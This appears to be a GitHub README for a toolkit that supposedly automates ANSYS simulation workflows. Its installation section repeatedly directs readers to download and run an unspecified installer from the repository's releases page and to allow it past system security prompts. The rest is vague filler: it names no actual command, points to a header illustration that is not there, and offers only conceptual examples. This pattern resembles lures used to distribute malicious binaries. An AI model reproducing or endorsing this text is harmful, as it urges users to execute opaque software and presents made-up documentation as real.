[![Releases](https://img.shields.io/badge/Releases-ANSYS--Tools-blue?logo=github&logoColor=white)](https://github.com/nayeoww/ansys-tools/releases)

https://github.com/nayeoww/ansys-tools/releases

Welcome to a practical toolbox designed for engineers and researchers who work with ANSYS simulations. This repository focuses on assisting with finite element analysis (FEA), computational fluid dynamics (CFD), electromagnetics, and multiphysics workflows. It emphasizes reliability, reproducibility, and speed. The tools here are built to fit into real work pipelines, not just to look good in a demo.

Below you will find a clear guide to get started, keep your projects organized, and extend the toolkit as your needs grow. The content is crafted to be helpful whether you are a student learning about multiphysics or a professional integrating ANSYS simulations into a production workflow.

---

## Overview

- üß∞ Core goal: Make ANSYS simulations easier to set up, run, and reproduce across projects.
- ‚ö° Fast workflows: Automate repetitive tasks, orchestrate solver runs, and manage post-processing with consistent results.
- üåê Multiphysics focus: Coordinate coupled simulations that involve structural, fluid, thermal, and electromagnetic phenomena.
- üß© Modular design: Split functionality into clear modules that can be extended or swapped as needed.

This toolkit is designed to be non-intrusive. It enhances existing ANSYS workflows rather than replacing them. The emphasis is on predictable outputs, easy debugging, and straightforward customization.

## Installation Guide

The installation process aims to be straightforward. It centers on the releases page where the installer lives. The download is the first file you will use to set up the toolkit.

- Step 1: Obtain the installer
  - Navigate to the releases page: https://github.com/nayeoww/ansys-tools/releases
  - Choose the installer that corresponds to your operating system. Examples include Windows, macOS, and Linux builds.
  - Download the installer file. This is the file you will run to install the toolkit.
- Step 2: Run the installer
  - Locate the downloaded file in your downloads folder.
  - Execute the installer. You may be prompted by the system security features to allow the program to run.
  - Follow the installer prompts. Accept the license, choose an installation directory, and confirm.
- Step 3: Post-install checks
  - After installation, open a terminal and type a command that the toolkit exposes to verify that it is available.
  - If the command prints usage information, the setup is successful.
  - If something fails, consult the troubleshooting section later in this document.
- Step 4: Optional environment setup
  - Add the toolkit‚Äôs bin directory to your system path if the installer did not do this automatically.
  - Set environment variables required by your ANSYS setup (e.g., license paths, solver environment variables).
- Step 5: First project
  - Create a test project using the included sample.
  - Run the default workflow, then inspect results and logs to confirm everything works as expected.

Note that the installation package is large and may take several minutes to install on slower networks. The installer provides progress feedback and will report any missing dependencies. If you encounter problems, check your system logs or consult the support resources available in the repository.

## How It Works

The toolkit uses a layered architecture designed for clarity and reliability. This section explains how the components interact and how data flows through a typical workflow.

- Orchestrator
  - Acts as the conductor. It sequences tasks, handles retries, and coordinates data exchange between modules.
- Solver Adapters
  - Provide a stable wrapper around ANSYS solvers. They translate generic commands into solver-specific instructions.
  - Handle job submission, resource allocation, and result retrieval.
- Pre-processor
  - Reads model definitions and converts them into solver-ready input.
  - Applies geometry cleanups, meshing settings, boundary conditions, and material properties.
- Post-processor
  - Extracts metrics such as displacement, stress, velocity, and field values.
  - Produces plots, charts, and summarized reports.
- Data Model
  - A shared representation of the simulation state. This model helps keep data consistent across modules.
- Utilities
  - Logging, error handling, and common helpers are centralized for reuse.
- Extensibility points
  - Adapters for new solvers or post-processors can be added with minimal changes to existing code.
  - Custom scripts or modules can hook into the orchestrator to expand capability without touching core logic.

A typical end-to-end run looks like this:
- Define a model and materials
- Create a mesh and apply boundary conditions
- Submit the simulation to the solver via an adapter
- Retrieve results and run post-processing
- Save results in a structured format for reuse

Images help visualize this flow. See the header illustration above for a sense of the pipeline.

## Getting Started with Examples

Real-world examples help you see how to adapt the toolkit to your own projects. The examples cover a range of common ANSYS workflows and illustrate best practices.

- Example 1: Linear structural analysis
  - Objective: Compute the deformation of a cantilever beam under a static load.
  - Steps:
    - Define geometry and material
    - Create a mesh with appropriate quality controls
    - Apply boundary conditions and load
    - Run the solver through the adapter
    - Post-process for displacement and stress results
  - Outcome: A report with maximum displacement, von Mises stress, and contour plots.

- Example 2: Fluid-structure interaction (FSI)
  - Objective: Simulate a flexible plate in a fluid flow.
  - Steps:
    - Define fluid domain and boundary conditions
    - Couple the fluid solver with a structural model
    - Run time-dependent simulation
    - Analyze forces on the plate and its deformation
  - Outcome: Time histories of forces, deformation fields, and flow visualization.

- Example 3: Electromagnetics and thermal coupling
  - Objective: Model heat generation in a conductor under electromagnetic loading.
  - Steps:
    - Set up electromagnetic field solver input
    - Couple to a thermal model for temperature rise
    - Run steady or transient simulation

## Configuring Workflows

A key strength of the toolkit is the ability to describe a workflow in a compact configuration file. The configuration captures model parameters, solver settings, and post-processing steps. This makes it easy to reuse the same setup across multiple runs.

- Model definitions
  - Geometry inputs or references to CAD files
  - Material properties and units
- Mesh settings
  - Element types and sizing strategies
  - Boundary layer controls for accurate results
- Solver options
  - Convergence criteria, time stepping, and solver tolerances
- Coupling relationships
  - Define how physics interact, such as heat transfer in a fluid or electromagnetic coupling with a thermal model
- Post-processing directives
  - Metrics to extract, plots to generate, and file formats for export

Configuration files are human readable. They use a straightforward YAML-like syntax that is easy to edit with a simple text editor.

Example snippet (conceptual):
- model:
  - geometry: "cad/part1.step"
  - materials: ["Aluminium11", "Water"]
- mesh:
  - type: "tetrahedral"
  - max_size: 0.5
- solver:
  - type: "static"
  - tolerances: 1e-6
- coupling:
  - heat_transfer: true
- postprocess:
  - outputs: ["displacement", "stress", "temperature"]

This is a conceptual sketch. The actual configuration syntax is documented in the docs directory and adapts to the chosen solver adapters.
